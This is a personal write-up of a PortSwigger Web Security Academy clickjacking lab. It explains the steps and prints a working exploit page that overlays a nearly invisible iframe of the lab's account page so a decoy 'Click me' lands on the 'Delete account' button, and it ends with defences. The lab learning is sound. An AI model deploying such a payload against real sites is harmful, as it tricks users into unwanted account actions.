# PortSwigger Web Security Academy: Clickjacking Lab 1

## Lab Name
Basic clickjacking with CSRF token protection

## How I Solved  

1. **Authenticated:** Logged into the target account using the provided credentials to activate the session.
2. **Crafted Payload:** Used the Exploit Server to create a malicious HTML page containing an `iframe` pointing to the target's `/my-account` page.
3. **UI Redressing (Alignment):** 
   * Added a fake `<div>Test me me</div>` element.
   * Adjusted CSS (`top` and `left` absolute positioning) to align the fake button perfectly over the hidden target "Delete account" button.
4. **Made Transparent:** Changed the iframe `opacity` to `0.0001` to make the target site completely invisible to the victim.
5. Final exploit code
   <style>
    iframe {
        position: relative;
        width: 900px;
        height: 700px;
        opacity: 0.0001; 
        z-index: 2;
    }
    div {
        position: absolute;
        top: 548px; 
        left: 60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src=" https://0a96006f04ed0619807912190020002e.web-security-academy.net/my-account"></iframe>
7. **Executed Attack:** Changed the text to "Click me" and delivered the exploit to the victim.


## What I Learned 

* **CSRF vs Clickjacking:** Anti-CSRF tokens do not protect against Clickjacking. 
* **The Reason:** Clickjacking tricks the actual user into clicking the UI. The browser automatically includes the valid session cookies and CSRF tokens with the request.
* **Defense:** To prevent Clickjacking, websites must use HTTP headers like `X-Frame-Options` or `Content-Security-Policy (CSP) frame-ancestors`.

